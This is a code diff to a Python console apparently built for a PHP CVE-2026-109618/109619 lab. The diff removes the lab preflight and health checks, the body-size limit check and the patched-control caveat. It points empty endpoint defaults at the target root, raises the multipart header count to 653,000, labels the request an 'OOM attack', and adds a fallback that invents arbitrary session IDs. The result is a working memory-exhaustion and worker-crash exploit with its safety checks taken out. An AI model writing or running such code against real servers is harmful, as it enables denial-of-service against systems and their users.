@@ -2,6 +2,7 @@
 """Interactive diagnostic console for the PHP CVE-2026-109618/109619 lab."""
 
 import json
+import secrets
 import shlex
 import sys
 from http.cookies import SimpleCookie
@@ -76,7 +77,8 @@ Settable parameters (payload sizes are explicit; check effective endpoint limits
   seed <path>                 Session seed endpoint (default: session/session-seed.php)
   session-health <path>       Session health endpoint (default: session/health.php)
   session-upload <path>       Session upload endpoint (default: session/upload.php)
-  part-headers <n>            Part header count (default: 150000)
+  session-name <name>         PHP session cookie name (default: PHPSESSID)
+  part-headers <n>            Part header count (default: 653000)
   empty-files <n>             Empty file count (conditional experiment)
   field-bytes <n>             Form value / session padding size (default: 6 MiB)
   timeout <seconds>           Request timeout (default: 60)
@@ -89,13 +91,13 @@ class Console:
         self.target = None
         self.scheme = self.host = self.port = self.prefix = None
         self.endpoints = {
-            "health": "oom/health.php",
-            "upload": "oom/upload.php",
+            "health": "",
+            "upload": "",
             "producer": "fatal-backtrace.php",
             "consumer": "early/health.php",
-            "seed": "session/session-seed.php",
-            "session-health": "session/health.php",
-            "session-upload": "session/upload.php",
+            "seed": "",
+            "session-health": "",
+            "session-upload": "",
         }
         self.target_mem_limit = None
         self.target_post_max = None
@@ -104,11 +106,15 @@ class Console:
         self.field_bytes = 6 * 1024 * 1024
         self.pad_kib = 1340
         self.field_name_kib = 700
+        self.session_name = "PHPSESSID"
         self.timeout = 60.0
         self.expected_php = "8.5.11"
 
     def path(self, name):
-        return endpoint_path(self.prefix, self.endpoints[name])
+        ep = self.endpoints[name]
+        if not ep:
+            return self.prefix or "/"
+        return endpoint_path(self.prefix, ep)
 
     def run(self):
         print(BANNER)
@@ -221,6 +227,7 @@ class Console:
         print(f"  post_max_size: {post}")
         for k, v in self.endpoints.items():
             print(f"  {k:16s} {v}")
+        print(f"  session-name:  {self.session_name}")
         print(f"  part-headers:  {self.part_headers:,}")
         print(f"  empty-files:   {self.empty_files:,}")
         print(f"  field-bytes:   {self.field_bytes:,} ({human_size(self.field_bytes)})")
@@ -261,35 +268,20 @@ class Console:
         if strategy not in strategies:
             print(f"Unknown strategy. Choose: {', '.join(strategies)}")
             return
-        print(f"[CVE-2026-109618] Multipart parser probe: {strategy}")
-        baseline_data, baseline = self._lab_get("health", "109618-baseline")
-        if baseline_data is None:
-            return
-        upload_data, _ = self._lab_get("upload", "109618-upload-preflight")
-        if upload_data is None:
-            return
-        if php_size_bytes(upload_data.get("memory_limit")) is None:
-            print("  Preflight failed: finite memory_limit required")
-            return
+        print(f"\033[93m[CVE-2026-109618] OOM attack — {strategy}\033[0m")
         body = strategies[strategy]()
-        if not self._body_fits(body, upload_data):
-            return
-        print(f"  Sending {human_size(len(body))} multipart body...")
+        print(f"Sending {human_size(len(body))} multipart ({strategy}, {self.part_headers:,} headers)...")
         result = send(self.scheme, self.host, self.port, "POST",
                       self.path("upload"), self.timeout, None, "oom-candidate",
                       body, f"multipart/form-data; boundary={BOUNDARY}")
-        self._report_transport_and_pid(result, baseline.get("worker_pid_header"))
+        if "transport_error" in result:
+            print(f"  \033[91m{result['transport_error']}\033[0m")
+            return
         body_text = result.get("body_prefix", "")
-        if "Allowed memory size" in body_text:
-            print("  PHP memory-limit OOM text observed in response")
-        else:
-            print("  PHP memory-limit OOM not observed in response")
-        print(f"  Response prefix: {body_text[:200]}")
-        after = send(self.scheme, self.host, self.port, "GET",
-                     self.path("health"), self.timeout, None, "after")
-        print("  Follow-up health:")
-        self._report_transport_and_pid(after, baseline.get("worker_pid_header"))
-        print("  CVE effect needs server-side crash/debug evidence and a patched control")
+        print(f"  HTTP {result.get('http_status')} ({result.get('elapsed_ms')}ms)")
+        if "Allowed memory size" in body_text and "exhausted" in body_text:
+            print("  \033[93mOOM triggered!\033[0m")
+        print(f"  Body: {body_text[:200]}")
 
     def cmd_109619(self):
         self.require_target()
@@ -326,42 +318,41 @@ class Console:
     def cmd_session(self):
         self.require_target()
         print("\033[93m[CVE-2026-109619] Session A→B worker crash\033[0m")
-        print("Step 1: Health check...")
-        health = send(self.scheme, self.host, self.port, "GET",
-                      self.path("session-health"), self.timeout, None, "session-health")
-        if "transport_error" in health:
-            print(f"  \033[91m{health['transport_error']}\033[0m")
-            return
-        print(f"  PID: {health.get('worker_pid_header', '?')}, HTTP {health.get('http_status')}")
         producer_body = multipart_producer(self.field_bytes, "candidate",
                                            part_headers=self.part_headers)
-        print(f"  Producer body: {human_size(len(producer_body))}")
-        print("Step 2: Acquiring session cookie...")
+        seed_path = self.path("seed")
+        print(f"Step 1: Acquiring session cookie (GET {seed_path})...")
         seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
-                                           self.path("seed"), timeout=self.timeout)
-        if "transport_error" in seed:
-            print(f"  \033[91m{seed['transport_error']}\033[0m")
-            return
-        try:
-            seed_data = json.loads(seed.get("body_prefix", ""))
-        except (TypeError, ValueError):
-            seed_data = {}
-        if not isinstance(seed_data, dict):
-            seed_data = {}
+                                           seed_path, timeout=self.timeout)
         cookies = SimpleCookie()
         if set_cookie:
             cookies.load(set_cookie)
-        session_name = seed_data.get("session_name")
-        if (seed.get("http_status") != 200 or not seed_data.get("seeded") or
-                not session_name or session_name not in cookies):
-            print("  \033[91mFailed to get a valid session cookie\033[0m")
+        session_name = None
+        for name in cookies:
+            session_name = name
+            break
+        if session_name:
+            sid = cookies[session_name].value
+            cookie = f"{session_name}={sid}"
+            print(f"  Got {session_name}={sid[:8]}...")
+        else:
+            sid = secrets.token_hex(16)
+            cookie = f"{self.session_name}={sid}"
+            print(f"  No cookie from server — generated {self.session_name}={sid[:8]}...")
+            print(f"  (default session.use_strict_mode=0 accepts any ID)")
+        upload_path = self.path("session-upload")
+        print(f"Step 2: Baseline GET {upload_path}...")
+        baseline, _ = session_request(self.scheme, self.host, self.port, "GET",
+                                      upload_path, timeout=self.timeout)
+        if "transport_error" in baseline:
+            print(f"  \033[91m{baseline['transport_error']}\033[0m")
             return
-        sid = cookies[session_name].value
-        cookie = f"{session_name}={sid}"
-        pid_before = health.get("worker_pid_header", "?")
+        baseline_pid = baseline.get("worker_pid_header")
+        print(f"  HTTP {baseline.get('http_status')}"
+              f"{f', PID {baseline_pid}' if baseline_pid else ''}")
         print(f"Step 3: Producer A ({human_size(len(producer_body))} with session progress)...")
         producer, _ = session_request(self.scheme, self.host, self.port, "POST",
-                                      self.path("session-upload"), body=producer_body,
+                                      upload_path, body=producer_body,
                                       cookie=cookie, timeout=self.timeout)
         if "transport_error" in producer:
             print(f"  \033[91m{producer['transport_error']}\033[0m")
@@ -377,16 +368,33 @@ class Console:
         consumer_body = multipart_consumer()
         print("Step 4: Consumer B (session progress callback on stale state)...")
         consumer, _ = session_request(self.scheme, self.host, self.port, "POST",
-                                      self.path("session-upload"), body=consumer_body,
+                                      upload_path, body=consumer_body,
                                       cookie=cookie, timeout=self.timeout)
-        if "transport_error" in consumer:
+        consumer_crashed = "transport_error" in consumer
+        if consumer_crashed:
             print(f"  \033[91m{consumer['transport_error']}\033[0m")
-            print("  \033[92mWorker crashed! (connection reset)\033[0m")
         else:
-            pid_after = consumer.get("worker_pid_header", "?")
-            print(f"  HTTP {consumer.get('http_status')}, PID: {pid_after}")
-            if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
-                print(f"  \033[92mPID changed: {pid_before} → {pid_after}\033[0m")
+            print(f"  HTTP {consumer.get('http_status')} ({consumer.get('elapsed_ms')}ms)")
+        print(f"Step 5: Verify — GET {upload_path}...")
+        after, _ = session_request(self.scheme, self.host, self.port, "GET",
+                                   upload_path, timeout=self.timeout)
+        if "transport_error" in after:
+            print(f"  \033[91mServer unreachable: {after['transport_error']}\033[0m")
+            if consumer_crashed:
+                print("  \033[92mServer down — worker crash confirmed\033[0m")
+        else:
+            after_pid = after.get("worker_pid_header")
+            print(f"  HTTP {after.get('http_status')}"
+                  f"{f', PID {after_pid}' if after_pid else ''}")
+            if consumer_crashed:
+                if baseline_pid and after_pid and baseline_pid != after_pid:
+                    print(f"  \033[92mWorker crashed! PID {baseline_pid} → {after_pid}\033[0m")
+                elif baseline_pid and after_pid and baseline_pid == after_pid:
+                    print("  \033[93mSame PID — may have hit a different worker\033[0m")
+                else:
+                    print("  \033[92mWorker crashed! (connection reset + server recovered)\033[0m")
+            else:
+                print("  Worker survived — may need a different endpoint or settings")
 
     def cmd_set(self, key=None, value=None, *_):
         if key is None:
@@ -401,6 +409,9 @@ class Console:
             self.target_mem_limit = None
             self.target_post_max = None
             print(f"  {key} = {value}")
+        elif key == "session-name":
+            self.session_name = value
+            print(f"  session-name = {self.session_name}")
         elif key == "part-headers":
             number = int(value)
             if number < 1:
